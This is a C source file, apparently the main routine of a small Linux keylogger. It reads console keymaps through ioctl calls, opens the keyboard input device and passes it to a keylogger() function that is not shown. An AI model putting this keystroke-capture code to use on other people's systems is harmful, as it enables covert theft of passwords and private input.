#include "main.h"

static int			**new_keymaps(int tablen, int sectionslen)
{
	int				**ret;

	ret = malloc(sizeof(*ret) * (tablen + 1));
	if (ret == NULL)
		return NULL;
	for (int i = 0; i < tablen; i++) {
		ret[i] = malloc(sizeof(**ret) * sectionslen);
		if (ret[i] == NULL) {
			for (int j = 0; j < i; j++)
				free(ret[j]);
			free(ret);
			return NULL;
		}
	}
	ret[tablen] = NULL;
	return ret;
}

static void 		free_tab(int ***tab)
{
	int				**ptr;

	if (tab && *tab)
	{
		ptr = *tab;
		while (*ptr)
			free(*ptr++);
		free(*tab);
		*tab = NULL;
	}
}

static int			has_keys(int fd, int n)
{
	struct kbentry	ke;

	ke.kb_table = 0;
	ke.kb_index = n;
	return !ioctl(fd, KDGKBENT, (unsigned long)&ke);
}

int					main(void)
{
	int				fd;
	int				nb_keys;
	int				**key_maps;
	int				nb_keymap;
	int				**key_table;
	char			*keyboard;

	if ((fd = get_console()) < 0)
		return 1;
	nb_keys = (has_keys(fd, 255) ? 256 : has_keys(fd, 127) ? 128 : 112);
	if ((key_maps = new_keymaps(2, MAX_NR_KEYMAPS)) == NULL)
		return 1;
	if ((nb_keymap = get_keymaps(fd, key_maps)) == 0)
		return 1;
	key_table = get_keys(fd, nb_keys, nb_keymap, key_maps);
	free_tab(&key_maps);
	close(fd);
	if (key_table == NULL)
		return 1;
	if ((keyboard = get_keyboard()) == NULL) {
		free_tab(&key_table);
		return 1;
	}
	if ((fd = open(keyboard, O_RDONLY)) < 0) {
		free(keyboard);
		free_tab(&key_table);
		return 1;
	}
	printf("keyboard: %s\n", keyboard);
	free(keyboard);
	keylogger(fd, key_table);
	close(fd);
	free_tab(&key_table);
	return 0;
}
